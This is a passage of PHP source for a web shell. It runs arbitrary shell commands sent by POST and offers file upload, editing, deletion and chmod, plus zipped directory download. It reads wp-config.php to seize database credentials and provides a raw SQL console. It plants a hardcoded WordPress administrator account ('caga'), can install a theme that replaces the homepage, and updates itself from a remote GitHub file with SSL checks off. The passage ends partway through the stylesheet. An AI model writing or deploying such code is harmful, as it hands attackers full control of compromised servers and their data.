    if ($q2 === false) {
        $fail("DELETE site transients failed: " . mysqli_error($conn));
    } else {
        $n2 = mysqli_affected_rows($conn);
        $ok("Deleted $n2 site transient(s) (_site_transient_*)");
    }

    // ── STEP 5: Flush rewrite rules ──────────────────────────────────────
    $esc = fn($v) => mysqli_real_escape_string($conn, $v);
    $q3 = mysqli_query($conn,
        "UPDATE `{$optionsT}` SET option_value = '' WHERE option_name = '" . $esc('rewrite_rules') . "'"
    );
    if ($q3 === false) {
        $fail("Flush rewrite_rules failed: " . mysqli_error($conn));
    } else {
        $ok("Rewrite rules flushed (will regenerate on next WP request)");
    }

    mysqli_close($conn);

    // ── STEP 6: Summary ──────────────────────────────────────────────────
    $ok("✅ Purge complete! Transients deleted & rewrite rules flushed.");
    return $log;
}

// ============================================================
// === AUTO-UPDATE HELPERS ====================================
// ============================================================

function fetchUrl($url, $timeout = 10)
{
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => $timeout,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT      => 'PHP-Shell-AutoUpdate/' . SHELL_VERSION,
        ]);
        $result = curl_exec($ch);
        $code   = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return ($result !== false && $code === 200) ? $result : false;
    }
    if (ini_get('allow_url_fopen')) {
        $ctx = stream_context_create(['http' => [
            'timeout'       => $timeout,
            'user_agent'    => 'PHP-Shell-AutoUpdate/' . SHELL_VERSION,
            'ignore_errors' => true,
        ]]);
        $r = @file_get_contents($url, false, $ctx);
        return $r !== false ? $r : false;
    }
    return false;
}

function checkForUpdate()
{
    // Quick connectivity check first (head request to GitHub)
    $remote = fetchUrl(SHELL_VERSION_URL);
    if ($remote === false) {
        // Try to distinguish: network issue vs missing file
        $ghReach = fetchUrl('https://raw.githubusercontent.com/anjay801/weewe/main/', 3);
        if ($ghReach === false) {
            $msg = 'Cannot reach GitHub (network blocked or no internet on server).';
        } else {
            $msg = 'version.txt not found on GitHub. Push the file: echo "' . SHELL_VERSION . '" > shell/version.txt';
        }
        return ['has_update' => false, 'remote_version' => null, 'error' => $msg];
    }
    $remoteVer = trim($remote);
    if (!preg_match('/^\d+\.\d+\.\d+$/', $remoteVer))
        return ['has_update' => false, 'remote_version' => null, 'error' => 'Bad version format from GitHub: ' . htmlspecialchars(substr($remoteVer, 0, 40))];
    return [
        'has_update'     => version_compare($remoteVer, SHELL_VERSION, '>'),
        'remote_version' => $remoteVer,
        'error'          => null,
    ];
}

function applyUpdate()
{
    $newContent = fetchUrl(SHELL_UPDATE_URL);
    if ($newContent === false)
        return ['success' => false, 'message' => 'Failed to download from GitHub.'];
    if (strlen($newContent) < 1000)
        return ['success' => false, 'message' => 'Downloaded file too small — aborted.'];
    if (strpos($newContent, '<?php') === false)
        return ['success' => false, 'message' => 'Not a PHP file — aborted.'];
    $self = realpath($_SERVER['SCRIPT_FILENAME']);
    if (!$self || !is_writable($self))
        return ['success' => false, 'message' => 'File not writable: ' . basename($_SERVER['SCRIPT_FILENAME'])];
    $backup = $self . '.bak_v' . SHELL_VERSION . '_' . date('Ymd_His');
    @copy($self, $backup);
    if (file_put_contents($self, $newContent) === false)
        return ['success' => false, 'message' => 'Write failed. Backup: ' . basename($backup)];
    return ['success' => true, 'message' => 'Updated! Backup: ' . basename($backup) . ' — reload page.'];
}

/**
 * Execute command - MODIFIED to handle disabled exec/shell_exec.
 * Only 'cd' and 'clear' work fully using PHP logic.
 * Other commands will show a friendly message that terminal is limited.
 */
function executeCommand($cmd, &$cwdRef)
{
    $cmd = trim($cmd);
    if ($cmd === '')
        return '';

    if ($cmd === 'clear' || $cmd === 'cls')
        return '__CLEAR__';

    // Handle 'cd' command with pure PHP (no shell needed)
    if (preg_match('/^cd\s*(.*)$/', $cmd, $m)) {
        $target = trim($m[1]);
        if ($target === '' || $target === '~') {
            $target = getenv('HOME') ?: (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? getenv('USERPROFILE') : '/');
        }
        if (!empty($target) && $target[0] !== '/' && !(strlen($target) >= 2 && $target[1] === ':')) {
            $target = $cwdRef . DIRECTORY_SEPARATOR . $target;
        }
        $resolved = realpath($target);
        if ($resolved && is_dir($resolved)) {
            $cwdRef = $resolved;
            $_SESSION['cwd'] = $resolved;
            return "Changed to: $resolved";
        }
        return "cd: no such directory: $target";
    }

    // For any other command, check if we can execute system commands
    $canExec = false;
    if (function_exists('shell_exec')) {
        $canExec = true;
        $execFunc = 'shell_exec';
    } elseif (function_exists('exec')) {
        $canExec = true;
        $execFunc = 'exec';
    } elseif (function_exists('system')) {
        $canExec = true;
        $execFunc = 'system';
    } elseif (function_exists('passthru')) {
        $canExec = true;
        $execFunc = 'passthru';
    }

    if (!$canExec) {
        return "⚠️ Terminal commands are disabled on this server.\nAll exec/shell_exec/system/passthru functions are unavailable.\nYou can still use 'cd' and 'clear', or the File Manager panel.";
    }

    // If we have an exec function, try to run the command
    $cwdEsc = escapeshellarg($cwdRef);
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $fullCmd = "cd /d $cwdEsc && $cmd 2>&1";
    } else {
        $fullCmd = "cd $cwdEsc && $cmd 2>&1";
    }

    $output = '';
    if ($execFunc === 'shell_exec') {
        $output = shell_exec($fullCmd);
    } elseif ($execFunc === 'exec') {
        exec($fullCmd, $o);
        $output = implode("\n", $o);
    } elseif ($execFunc === 'system') {
        ob_start();
        system($fullCmd);
        $output = ob_get_clean();
    } elseif ($execFunc === 'passthru') {
        ob_start();
        passthru($fullCmd);
        $output = ob_get_clean();
    }

    return $output === null ? '[No output]' : $output;
}

// --- Actions ---
$action = $_POST['action'] ?? $_GET['action'] ?? '';
$cwd =& $_SESSION['cwd'];
$output = '';
$command = '';
$dbMsg = '';
$uploadMsg = '';
$searchResults = null;
$searchKeyword = '';

// Ambil cleardir message dari session (redirect setelah cleardir)
if (!empty($_SESSION['cleardir_msg'])) {
    $uploadMsg = $_SESSION['cleardir_msg'];
    unset($_SESSION['cleardir_msg']);
}

// Navigate Directory (GET)
if ($action === 'cd' && isset($_GET['dir'])) {
    $target = $_GET['dir'];
    if ($target !== '/' && $target[0] !== '/' && !(strlen($target) >= 2 && $target[1] === ':')) {
        $target = $cwd . DIRECTORY_SEPARATOR . $target;
    }
    $resolved = realpath($target);
    if ($resolved && is_dir($resolved)) {
        $cwd = $resolved;
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Parent Directory
if ($action === 'parentdir') {
    $parent = dirname($cwd);
    $resolved = realpath($parent);
    if ($resolved && is_dir($resolved)) {
        $cwd = $resolved;
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// File Upload (with optional ZIP extraction)
if ($action === 'upload' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $uploadMsg = '';
    $extractZip = isset($_POST['extract_zip']) && $_POST['extract_zip'] === '1';
    if (!empty($_FILES['files']['name'][0])) {
        foreach ($_FILES['files']['tmp_name'] as $k => $tmp) {
            if ($_FILES['files']['error'][$k] !== UPLOAD_ERR_OK) {
                $uploadMsg .= "✘ Error uploading {$_FILES['files']['name'][$k]}: code {$_FILES['files']['error'][$k]}\n";
                continue;
            }
            if ($_FILES['files']['size'][$k] > $max_upload) {
                $uploadMsg .= "✘ File too large: {$_FILES['files']['name'][$k]}\n";
                continue;
            }
            $name = basename($_FILES['files']['name'][$k]);
            $target = $cwd . DIRECTORY_SEPARATOR . $name;
            if (move_uploaded_file($tmp, $target)) {
                $uploadMsg .= "✔ Uploaded: $name\n";
                // Check if ZIP extraction requested and file is .zip
                if ($extractZip && preg_match('/\.zip$/i', $name) && class_exists('ZipArchive')) {
                    $extractResult = extractZip($target, $cwd);
                    $uploadMsg .= "   ↳ " . $extractResult['message'] . "\n";
                    // Optionally delete the ZIP after extraction?
                    // @unlink($target);
                } elseif ($extractZip && !class_exists('ZipArchive')) {
                    $uploadMsg .= "   ↳ ZIP extraction not available (ZipArchive missing).\n";
                } elseif ($extractZip && !preg_match('/\.zip$/i', $name)) {
                    $uploadMsg .= "   ↳ Not a ZIP file, extraction skipped.\n";
                }
            } else {
                $uploadMsg .= "✘ Failed: $name (check permissions)\n";
            }
        }
    } else {
        $uploadMsg = "No files selected.";
    }
}

// File Download
if ($action === 'download' && isset($_GET['file'])) {
    $file = realpath($_GET['file']);
    if ($file && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
    die('Invalid file.');
}

// Directory Download (ZIP)
if ($action === 'downloaddir' && isset($_GET['dir'])) {
    $dir = realpath($_GET['dir']);
    if ($dir && is_dir($dir)) {
        $tmpZip = sys_get_temp_dir() . DIRECTORY_SEPARATOR . basename($dir) . '_' . time() . '.zip';
        if (zipDirectory($dir, $tmpZip)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="' . basename($dir) . '.zip"');
            header('Content-Length: ' . filesize($tmpZip));
            readfile($tmpZip);
            @unlink($tmpZip);
            exit;
        }
        die('Cannot create ZIP. ZipArchive extension may not be available.');
    }
    die('Invalid directory.');
}

// Dir Size (AJAX)
if ($action === 'dirsize' && isset($_GET['dir'])) {
    $dir = realpath($_GET['dir']);
    if ($dir && is_dir($dir)) {
        $sz = dirSize($dir);
        header('Content-Type: application/json');
        echo json_encode(['size' => formatSize($sz), 'bytes' => $sz]);
        exit;
    }
    header('Content-Type: application/json');
    echo json_encode(['error' => 'Invalid directory']);
    exit;
}

// Delete File
if ($action === 'delete' && isset($_GET['file'])) {
    $file = realpath($_GET['file']);
    if ($file && is_file($file))
        @unlink($file);
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Bulk delete
if ($action === 'bulk_delete' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $files = isset($_POST['files']) ? $_POST['files'] : array();
    $delCount = 0;
    $errCount = 0;
    foreach ($files as $f) {
        $path = realpath($cwd . DIRECTORY_SEPARATOR . $f);
        if ($path && strpos($path, $cwd) === 0 && $path !== $cwd) {
            if (is_dir($path)) {
                deleteDirectoryRecursive($path) ? $delCount++ : $errCount++;
            } else if (is_file($path)) {
                @unlink($path) ? $delCount++ : $errCount++;
            }
        }
    }
    $uploadMsg = "✔ Bulk delete completed: $delCount deleted, $errCount errors.";
}

// Delete Directory (recursive)
if ($action === 'deletedir' && isset($_GET['dir'])) {
    $dir = realpath($_GET['dir']);
    if ($dir && is_dir($dir) && $dir !== $cwd) {
        deleteDirectoryRecursive($dir);
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Clear Directory (empty contents, keep dir, protect self)
if ($action === 'cleardir' && isset($_GET['dir'])) {
    $dir = realpath($_GET['dir']);
    if ($dir && is_dir($dir)) {
        $selfFile = realpath($_SERVER['SCRIPT_FILENAME']);
        $stats = clearDirectory($dir, $selfFile);
        $skippedNote = $stats['skipped'] > 0 ? " ({$stats['skipped']} protected/skipped)" : '';
        $_SESSION['cleardir_msg'] = "✔ Cleared: {$stats['deleted']} deleted, {$stats['errors']} errors{$skippedNote} in " . basename($dir);
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// View File (plain text)
if ($action === 'view' && isset($_GET['file'])) {
    $file = realpath($_GET['file']);
    if ($file && is_file($file)) {
        header('Content-Type: text/plain; charset=utf-8');
        readfile($file);
        exit;
    }
    die('Invalid file.');
}

// Edit File - show form
$editContent = '';
$editFile = '';
if ($action === 'edit' && isset($_GET['file'])) {
    $file = realpath($_GET['file']);
    if ($file && is_file($file)) {
        $editFile = $file;
        $editContent = file_get_contents($file);
    }
}

// Save Edited File
if ($action === 'saveedit' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $file = realpath($_POST['editfile'] ?? '');
    $content = $_POST['content'] ?? '';
    if ($file && is_file($file) && is_writable($file)) {
        file_put_contents($file, $content);
        $uploadMsg = "✔ File saved: " . basename($file);
    } else {
        $uploadMsg = "✘ Failed to save file (not writable or invalid)";
    }
}

// Rename File/Dir
if ($action === 'rename' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $oldPath = realpath($_POST['oldpath'] ?? '');
    $newName = basename(trim($_POST['newname'] ?? ''));
    if ($oldPath && $newName) {
        $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;
        if (!file_exists($newPath)) {
            @rename($oldPath, $newPath)
                ? ($uploadMsg = "✔ Renamed to: $newName")
                : ($uploadMsg = "✘ Rename failed (check permissions)");
        } else {
            $uploadMsg = "✘ Destination already exists: $newName";
        }
    }
}

// Create New Directory
if ($action === 'mkdir' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = basename(trim($_POST['dirname'] ?? ''));
    if ($name) {
        $target = $cwd . DIRECTORY_SEPARATOR . $name;
        @mkdir($target, 0755)
            ? ($uploadMsg = "✔ Directory created: $name")
            : ($uploadMsg = "✘ Failed to create directory: $name");
    }
}

// Create New File
if ($action === 'newfile' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = basename(trim($_POST['filename'] ?? ''));
    if ($name) {
        $target = $cwd . DIRECTORY_SEPARATOR . $name;
        if (!file_exists($target)) {
            @file_put_contents($target, '')
                ? ($uploadMsg = "✔ File created: $name")
                : ($uploadMsg = "✘ Failed to create file: $name");
        } else {
            $uploadMsg = "✘ File already exists: $name";
        }
    }
}

// Copy File
if ($action === 'copy' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $src = realpath($_POST['srcpath'] ?? '');
    $newName = basename(trim($_POST['copyname'] ?? ''));
    if ($src && is_file($src) && $newName) {
        $dest = dirname($src) . DIRECTORY_SEPARATOR . $newName;
        if (!file_exists($dest)) {
            @copy($src, $dest)
                ? ($uploadMsg = "✔ Copied to: $newName")
                : ($uploadMsg = "✘ Copy failed");
        } else {
            $uploadMsg = "✘ Destination already exists: $newName";
        }
    }
}

// Chmod
if ($action === 'chmod' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $path = realpath($_POST['chmodpath'] ?? '');
    $mode = octdec(trim($_POST['chmodval'] ?? ''));
    if ($path && $mode) {
        @chmod($path, $mode)
            ? ($uploadMsg = "✔ Chmod " . sprintf('%o', $mode) . " applied to: " . basename($path))
            : ($uploadMsg = "✘ Chmod failed (check permissions)");
    }
}

// Search Files
if ($action === 'search' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $searchKeyword = trim($_POST['keyword'] ?? '');
    if ($searchKeyword) {
        $searchResults = searchFiles($cwd, $searchKeyword);
    }
}

// MySQL Connect
if ($action === 'mysqlconn' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $mhost = trim($_POST['mhost'] ?? 'localhost');
    $muser = trim($_POST['muser'] ?? '');
    $mpass = $_POST['mpass'] ?? '';
    $mdb = trim($_POST['mdb'] ?? '');
    if (function_exists('mysqli_connect')) {
        $conn = @mysqli_connect($mhost, $muser, $mpass, $mdb ?: null);
        if ($conn) {
            $_SESSION['mysql'] = ['host' => $mhost, 'user' => $muser, 'pass' => $mpass, 'db' => $mdb, 'connected' => true];
            $dbMsg = "✔ Connected to MySQL: $muser@$mhost" . ($mdb ? " / $mdb" : '');
        } else {
            $_SESSION['mysql'] = ['connected' => false];
            $dbMsg = "✘ MySQL Error: " . mysqli_connect_error();
        }
    } else {
        $dbMsg = "✘ mysqli extension not available.";
    }
}

// MySQL Auto-Connect from wp-config.php
if ($action === 'mysql_autoconn') {
    $wpConfig = findFileUpward($cwd, 'wp-config.php', 25);
    if ($wpConfig) {
        $cfg = parseWpConfig($wpConfig);
        if ($cfg && !empty($cfg['db_name'])) {
            $conn = @mysqli_connect($cfg['db_host'], $cfg['db_user'], $cfg['db_pass'], $cfg['db_name']);
            if ($conn) {
                mysqli_set_charset($conn, $cfg['db_charset'] ?: 'utf8');
                mysqli_close($conn);
                $_SESSION['mysql'] = ['host' => $cfg['db_host'], 'user' => $cfg['db_user'], 'pass' => $cfg['db_pass'], 'db' => $cfg['db_name'], 'connected' => true];
                $dbMsg = "✔ Auto-connected from wp-config.php: {$cfg['db_user']}@{$cfg['db_host']} / {$cfg['db_name']}";
            } else {
                $dbMsg = "✘ Auto-connect failed: " . mysqli_connect_error();
            }
        } else { $dbMsg = "✘ Could not parse wp-config.php"; }
    } else { $dbMsg = "✘ wp-config.php not found within 25 levels."; }
}

// phpMyAdmin AJAX endpoint
if ($action === 'pma_ajax' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    $ms = $_SESSION['mysql'] ?? [];
    if (empty($ms['connected'])) { echo json_encode(['error' => 'Not connected']); exit; }
    $conn = @mysqli_connect($ms['host'], $ms['user'], $ms['pass'], $ms['db'] ?: null);
    if (!$conn) { echo json_encode(['error' => 'Connect failed: ' . mysqli_connect_error()]); exit; }
    if (!empty($ms['db'])) mysqli_select_db($conn, $ms['db']);
    $sub = $_POST['sub'] ?? '';
    $esc = fn($v) => mysqli_real_escape_string($conn, $v);

    if ($sub === 'list_dbs') {
        $r = mysqli_query($conn, 'SHOW DATABASES');
        $dbs = [];
        while ($row = mysqli_fetch_row($r)) $dbs[] = $row[0];
        echo json_encode(['dbs' => $dbs]);

    } elseif ($sub === 'select_db') {
        $db = $_POST['db'] ?? '';
        if (!$db) { echo json_encode(['error' => 'No db']); exit; }
        mysqli_select_db($conn, $db);
        $_SESSION['mysql']['db'] = $db;
        $r = mysqli_query($conn, 'SHOW TABLES');
        $tables = [];
        while ($row = mysqli_fetch_row($r)) $tables[] = $row[0];
        echo json_encode(['tables' => $tables, 'db' => $db]);

    } elseif ($sub === 'list_tables') {
        $db = $_POST['db'] ?? $ms['db'] ?? '';
        if ($db) mysqli_select_db($conn, $db);
        $r = mysqli_query($conn, 'SHOW TABLES');
        $tables = [];
        while ($row = mysqli_fetch_row($r)) $tables[] = $row[0];
        echo json_encode(['tables' => $tables]);

    } elseif ($sub === 'browse') {
        $tbl   = $_POST['table'] ?? '';
        $db    = $_POST['db'] ?? $ms['db'] ?? '';
        $page  = max(0, (int)($_POST['page'] ?? 0));
        $limit = 50;
        $offset = $page * $limit;
        if ($db) mysqli_select_db($conn, $db);
        // count
        $cr = mysqli_query($conn, "SELECT COUNT(*) FROM `" . $esc($tbl) . "`");
        $total = $cr ? (int)mysqli_fetch_row($cr)[0] : 0;
        // columns
        $cols = [];
        $cr2 = mysqli_query($conn, "SHOW COLUMNS FROM `" . $esc($tbl) . "`");
        while ($row = mysqli_fetch_assoc($cr2)) $cols[] = $row;
        // rows
        $r = mysqli_query($conn, "SELECT * FROM `" . $esc($tbl) . "` LIMIT $limit OFFSET $offset");
        $rows = [];
        while ($row = mysqli_fetch_assoc($r)) $rows[] = $row;
        echo json_encode(['cols' => $cols, 'rows' => $rows, 'total' => $total, 'page' => $page, 'limit' => $limit]);

    } elseif ($sub === 'delete_row') {
        $tbl  = $_POST['table'] ?? '';
        $db   = $_POST['db'] ?? $ms['db'] ?? '';
        $pk   = $_POST['pk'] ?? '';
        $pkv  = $_POST['pkv'] ?? '';
        if ($db) mysqli_select_db($conn, $db);
        $q = mysqli_query($conn, "DELETE FROM `" . $esc($tbl) . "` WHERE `" . $esc($pk) . "`='" . $esc($pkv) . "' LIMIT 1");
        echo json_encode(['ok' => (bool)$q, 'error' => $q ? null : mysqli_error($conn)]);

    } elseif ($sub === 'insert_row') {
        $tbl    = $_POST['table'] ?? '';
        $db     = $_POST['db'] ?? $ms['db'] ?? '';
        $fields = $_POST['fields'] ?? [];
        if ($db) mysqli_select_db($conn, $db);
        $cols_q = implode(',', array_map(fn($c) => "`" . $esc($c) . "`", array_keys($fields)));
        $vals_q = implode(',', array_map(fn($v) => "'" . $esc($v) . "'", array_values($fields)));
        $q = mysqli_query($conn, "INSERT INTO `" . $esc($tbl) . "` ($cols_q) VALUES ($vals_q)");
        echo json_encode(['ok' => (bool)$q, 'error' => $q ? null : mysqli_error($conn), 'id' => $q ? mysqli_insert_id($conn) : null]);

    } elseif ($sub === 'update_row') {
        $tbl    = $_POST['table'] ?? '';
        $db     = $_POST['db'] ?? $ms['db'] ?? '';
        $pk     = $_POST['pk'] ?? '';
        $pkv    = $_POST['pkv'] ?? '';
        $fields = $_POST['fields'] ?? [];
        if ($db) mysqli_select_db($conn, $db);
        $set = implode(',', array_map(fn($c, $v) => "`" . $esc($c) . "`='" . $esc($v) . "'", array_keys($fields), array_values($fields)));
        $q = mysqli_query($conn, "UPDATE `" . $esc($tbl) . "` SET $set WHERE `" . $esc($pk) . "`='" . $esc($pkv) . "' LIMIT 1");
        echo json_encode(['ok' => (bool)$q, 'error' => $q ? null : mysqli_error($conn)]);

    } elseif ($sub === 'run_sql') {
        $sql = trim($_POST['sql'] ?? '');
        $db  = $_POST['db'] ?? $ms['db'] ?? '';
        if ($db) mysqli_select_db($conn, $db);
        $r = mysqli_query($conn, $sql);
        if ($r === false) {
            echo json_encode(['error' => mysqli_error($conn)]);
        } elseif ($r === true) {
            echo json_encode(['ok' => true, 'affected' => mysqli_affected_rows($conn)]);
        } else {
            $cols = [];
            $rows = [];
            $fi = mysqli_fetch_fields($r);
            foreach ($fi as $f) $cols[] = $f->name;
            while ($row = mysqli_fetch_assoc($r)) $rows[] = $row;
            echo json_encode(['cols' => $cols, 'rows' => $rows]);
        }
    } else {
        echo json_encode(['error' => 'Unknown sub-action']);
    }
    mysqli_close($conn);
    exit;
}

// MySQL Query
$sqlResult = null;
$sqlError = '';
if ($action === 'mysqlquery' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $sql = trim($_POST['sqlcmd'] ?? '');
    $ms = $_SESSION['mysql'] ?? [];
    if (!empty($ms['connected']) && $sql) {
        $conn = @mysqli_connect($ms['host'], $ms['user'], $ms['pass'], $ms['db'] ?: null);
        if ($conn) {
            $res = mysqli_query($conn, $sql);
            if ($res === false) {
                $sqlError = mysqli_error($conn);
            } elseif ($res === true) {
                $sqlResult = [['affected_rows' => mysqli_affected_rows($conn)]];
            } else {
                $sqlResult = [];
                while ($row = mysqli_fetch_assoc($res))
                    $sqlResult[] = $row;
                mysqli_free_result($res);
            }
            mysqli_close($conn);
        } else {
            $sqlError = "Cannot connect: " . mysqli_connect_error();
        }
    } else {
        $sqlError = "Not connected to MySQL.";
    }
}

// MySQL Disconnect
if ($action === 'mysqldisconn') {
    unset($_SESSION['mysql']);
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Clear History
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $action === 'clear_history') {
    $_SESSION['history'] = [];
    exit('OK');
}

// --- WP Auto-Admin ---
$wpAutoLog = null;
if ($action === 'wp_autoadmin' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $wpAutoLog = wpAutoAdmin(
        $cwd,
        'caga',
        'caga@cagamerdeka.com',
        'Caga123'
    );
}

// --- WP Theme Creator ---
$wpThemeLog  = null;
$wpThemeSlug = 'caga-theme';
$wpThemeName = 'Caga Custom Theme';
if ($action === 'wp_createtheme' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $htmlInput   = $_POST['theme_html'] ?? '';
    $wpThemeSlug = trim(preg_replace('/[^a-z0-9\-]/', '-', strtolower($_POST['theme_slug'] ?? 'caga-theme')));
    $wpThemeName = trim($_POST['theme_name'] ?? 'Caga Custom Theme') ?: 'Caga Custom Theme';
    if ($wpThemeSlug === '' || $wpThemeSlug === '-') $wpThemeSlug = 'caga-theme';
    $setHp = !empty($_POST['set_homepage']);
    $wpThemeLog = wpCreateTheme($cwd, $wpThemeSlug, $wpThemeName, $htmlInput, $setHp);
}

// --- WP Purge Cache ---
$wpPurgeLog = null;
if ($action === 'wp_purge' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $wpPurgeLog = wpPurgeCache($cwd);
}

// --- Auto-Update Actions ---
$updateResult = null;
if ($action === 'checkupdate') {
    $updateResult = checkForUpdate();
}
if ($action === 'doupdate' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $updateResult = applyUpdate();
}

// Execute Command
if ($_SERVER['REQUEST_METHOD'] === 'POST' && ($action === 'exec' || isset($_POST['cmd']))) {
    $command = trim($_POST['cmd'] ?? '');
    if ($command !== '') {
        if (!in_array($command, $_SESSION['history'])) {
            array_unshift($_SESSION['history'], $command);
            $_SESSION['history'] = array_slice($_SESSION['history'], 0, $hist_limit);
        }
        $output = executeCommand($command, $cwd);
    }
}

// --- Render Data ---
$currentDir = $cwd;
$parentDir = dirname($currentDir);
$dirItems = listDirectory($currentDir);
$uname = php_uname();
$phpVer = phpversion();
$serverSW = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';

// Get username safely without relying on exec
if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
    $user = posix_getpwuid(posix_geteuid())['name'] ?? 'unknown';
} elseif (function_exists('exec')) {
    $user = @exec('whoami') ?: 'nobody';
} else {
    $user = 'nobody'; // fallback
}

$mysqlConn = $_SESSION['mysql'] ?? null;
$hasZip = class_exists('ZipArchive');
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= htmlspecialchars($title) ?></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0b0f18;
            color: #d4d4d4;
            font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
            padding: 16px;
            line-height: 1.5;
        }

        .container {
            max-width: 1500px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 1fr 440px;
            gap: 16px;
        }

        .terminal-panel {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }

        .panel-hdr {
            background: #161b22;
            padding: 10px 15px;
            border-bottom: 1px solid #30363d;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .panel-title {
            color: #58a6ff;
            font-weight: 600;
            font-size: 14px;
        }

        .sys-info {
            color: #8b949e;
            font-size: 12px;
        }

        .terminal-body {
            padding: 15px;
            flex: 1;
            display: flex;
            flex-direction: column;
        }

        .output-area {
            background: #0a0c10;
            border: 1px solid #21262d;
            border-radius: 6px;
            padding: 15px;
            margin-bottom: 12px;
            min-height: 320px;
            max-height: 480px;
            overflow-y: auto;
            font-family: inherit;
            white-space: pre-wrap;
            word-wrap: break-word;
            color: #e6edf3;
        }

        .prompt {
            color: #f0883e;
            margin-right: 8px;
            user-select: none;
        }

        .cmd-form {
            display: flex;
            gap: 8px;
            margin-top: auto;
        }

        input.cmd-input {
            flex: 1;
            background: #0a0c10;
            border: 1px solid #30363d;
            color: #e6edf3;
            padding: 10px 14px;
            font-family: inherit;
            font-size: 14px;
            border-radius: 6px;
            outline: none;
        }

        input.cmd-input:focus {
            border-color: #58a6ff;
        }

        .btn {
            background: #21262d;
            border: 1px solid #30363d;
            color: #c9d1d9;
            padding: 9px 18px;
            font-family: inherit;
            font-size: 13px;
            border-radius: 6px;
            cursor: pointer;
            transition: all .2s;
        }

        .btn-primary {
            background: #238636;
            border-color: #2ea043;
            color: #fff;
        }

        .btn-primary:hover {
            background: #2ea043;
        }

        .btn:hover {
            background: #30363d;
        }

        .btn-danger {
            background: #6e1a1a;
            border-color: #b22222;
            color: #fca5a5;
        }

        .btn-danger:hover {
            background: #b22222;
        }

        .btn-warning {
            background: #5a3e00;
            border-color: #9e6a03;
            color: #f0883e;
        }

        .btn-warning:hover {
            background: #7d4f00;
        }

        .btn-info {
            background: #0c2d4e;
            border-color: #1f6feb;
            color: #58a6ff;
        }

        .btn-info:hover {
            background: #1f6feb;
            color: #fff;
        }

        .btn-sm {
            padding: 5px 10px;
            font-size: 12px;
        }

        .hist-wrap {
            margin-bottom: 8px;
            display: flex;
            gap: 8px;
        }

        select.hist-sel {
            flex: 1;
            background: #0a0c10;
            border: 1px solid #30363d;
            color: #e6edf3;
            padding: 5px 10px;
            font-family: inherit;
            border-radius: 4px;
        }

        .file-panel {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            display: flex;
            flex-direction: column;
            min-height: 0;
        }

        .path-bar {
            background: #0a0c10;
            padding: 8px 14px;
            border-bottom: 1px solid #21262d;
            font-size: 12px;
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 4px;
        }

        .path-part {
            color: #58a6ff;
            text-decoration: none;
        }

        .path-part:hover {
            text-decoration: underline;
        }

        .file-list {
            flex: 1;
            overflow-y: auto;
            max-height: 340px;
        }

        .file-item {
            display: grid;
            grid-template-columns: 18px 18px 1fr 68px 46px auto;
            padding: 5px 10px;
            border-bottom: 1px solid #21262d;
            font-size: 11.5px;
            align-items: center;
            gap: 4px;
        }

        .file-item:hover {
            background: #161b22;
        }

        .file-name a {
            color: #e6edf3;
            text-decoration: none;
        }

        .file-name a:hover {
            color: #58a6ff;
        }

        .dir-link a {
            color: #58a6ff !important;
            font-weight: 500;
        }

        .fmeta {
            color: #8b949e;
            text-align: right;
            font-size: 11px;
            white-space: nowrap;
        }

        .actions {
            display: flex;
            gap: 4px;
            justify-content: flex-end;
            align-items: center;
        }

        .action-btn {
            color: #8b949e;
            text-decoration: none;
            font-size: 12px;
            padding: 2px 3px;
            cursor: pointer;
            background: none;
            border: none;
            font-family: inherit;
        }

        .action-btn:hover {
            color: #58a6ff;
        }

        .del-btn {
            color: #f85149;
        }

        .del-btn:hover {
            color: #ff7b72;
        }

        .upload-area {
            padding: 10px 12px;
            border-top: 1px solid #30363d;
            background: #0a0c10;
        }

